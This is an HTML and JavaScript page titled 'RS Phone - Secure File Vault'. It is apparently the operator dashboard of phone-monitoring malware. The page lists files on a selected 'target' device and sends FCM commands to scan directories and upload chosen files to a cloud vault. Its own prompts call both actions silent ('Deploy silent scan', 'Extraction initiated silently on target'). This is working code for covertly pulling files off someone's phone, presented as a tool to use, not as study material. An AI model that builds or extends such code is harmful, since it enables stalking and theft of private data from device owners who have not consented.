<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RS Phone - Secure File Vault</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, sans-serif; }
        body { background-color: #121212; color: #ffffff; padding: 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; }
        .header-left { display: flex; align-items: center; gap: 15px; }
        .back-btn { background: #2a2a2a; border: none; border-radius: 8px; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; cursor: pointer; color: #fff; text-decoration: none; }
        .btn { padding: 10px 15px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; background: #3498db; color: white; display: flex; align-items: center; gap: 8px; }
        .btn-warning { background: #f39c12; }
        .table-container { background: #1e1e1e; border-radius: 8px; overflow: hidden; }
        table { width: 100%; border-collapse: collapse; text-align: left; }
        th, td { padding: 15px; border-bottom: 1px solid #333; }
        th { background: #2a2a2a; color: #aaa; text-transform: uppercase; font-size: 12px; }
        tr:hover { background: #252525; }
        .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
        .status-cloud { background: rgba(46, 204, 113, 0.2); color: #2ecc71; border: 1px solid #2ecc71; }
        .status-device { background: rgba(243, 156, 18, 0.2); color: #f39c12; border: 1px solid #f39c12; }
    </style>
</head>
<body>

    <div class="header">
        <div class="header-left">
            <a href="/remote-center" class="back-btn"><i data-lucide="chevron-left"></i></a>
            <div>
                <h2>File Vault</h2>
                <div style="font-size: 12px; color: #888; margin-top: 4px;" id="device-status">Connecting to target...</div>
            </div>
        </div>
        <div>
            <button class="btn btn-warning" onclick="triggerDirectoryScan('/')">
                <i data-lucide="scan" style="width:16px;"></i> Deep Scan Root (/)
            </button>
        </div>
    </div>

    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Type</th>
                    <th>File Name</th>
                    <th>Size</th>
                    <th>Status</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="file-table-body">
                <tr><td colspan="5" style="text-align: center; color: #888;">Loading directory structure...</td></tr>
            </tbody>
        </table>
    </div>

    <script>
        lucide.createIcons();
        const deviceId = localStorage.getItem('active_device_id');
        const token = localStorage.getItem('owner_token');

        if (!deviceId) alert("Critical: No active target selected!");

        // 1. Fetch File Tree from Backend
        async function fetchFileTree() {
            try {
                const res = await fetch(`/api/devices/${deviceId}/files?path=/`);
                const result = await res.json();
                
                const tbody = document.getElementById('file-table-body');
                tbody.innerHTML = '';

                if (result.data && result.data.length > 0) {
                    result.data.forEach(file => {
                        const icon = file.is_directory ? 'folder' : 'file';
                        const size = file.is_directory ? '--' : (file.size_bytes / 1024 / 1024).toFixed(2) + ' MB';
                        
                        let statusHtml = file.is_downloaded 
                            ? `<span class="status-badge status-cloud">In Cloud Vault</span>`
                            : `<span class="status-badge status-device">On Device Only</span>`;

                        let actionHtml = '';
                        if (file.is_directory) {
                            actionHtml = `<button class="btn" style="background:#555; font-size:11px;" onclick="triggerDirectoryScan('${file.folder_path}${file.file_name}/')">Scan Folder</button>`;
                        } else if (file.is_downloaded && file.file_url) {
                            actionHtml = `<a href="${file.file_url}" target="_blank" class="btn" style="background:#2ecc71; font-size:11px; text-decoration:none;">View / Download</a>`;
                        } else {
                            actionHtml = `<button class="btn" style="font-size:11px;" onclick="extractSpecificFile('${file.folder_path}${file.file_name}')">Extract to Cloud</button>`;
                        }

                        tbody.innerHTML += `
                            <tr>
                                <td><i data-lucide="${icon}"></i></td>
                                <td>${file.file_name}</td>
                                <td>${size}</td>
                                <td>${statusHtml}</td>
                                <td>${actionHtml}</td>
                            </tr>
                        `;
                    });
                    lucide.createIcons();
                } else {
                    tbody.innerHTML = `<tr><td colspan="5" style="text-align: center; color: #888;">No files mapped yet. Click Deep Scan.</td></tr>`;
                }
            } catch (e) {
                console.error("Fetch error:", e);
            }
        }

        // 2. FCM Trigger: Scan Directory
        async function triggerDirectoryScan(path) {
            if (!confirm(`Deploy silent scan on directory: ${path}?`)) return;
            try {
                const res = await fetch(`/api/devices/${deviceId}/action`, {
                    method: 'POST',
                    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: `SYNC_FILE_TREE:${path}` })
                });
                const result = await res.json();
                if(result.status === 'success') {
                    alert("Scan command deployed via FCM. Refreshing view in 5 seconds...");
                    setTimeout(fetchFileTree, 5000);
                } else alert("Dispatch failed: " + result.message);
            } catch(e) { alert("Network exception."); }
        }

        // 3. FCM Trigger: Extract File
        async function extractSpecificFile(fullPath) {
            if (!confirm(`Extract file ${fullPath} from device to cloud vault? This may take time based on network.`)) return;
            try {
                const res = await fetch(`/api/devices/${deviceId}/action`, {
                    method: 'POST',
                    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: `UPLOAD_SPECIFIC_FILE:${fullPath}` })
                });
                const result = await res.json();
                if(result.status === 'success') {
                    alert("Extraction initiated silently on target. Check back in a few minutes.");
                } else alert("Dispatch failed: " + result.message);
            } catch(e) { alert("Network exception."); }
        }

        // Init
        document.getElementById('device-status').innerText = `Target ID: ${deviceId}`;
        fetchFileTree();
    </script>
</body>
</html>
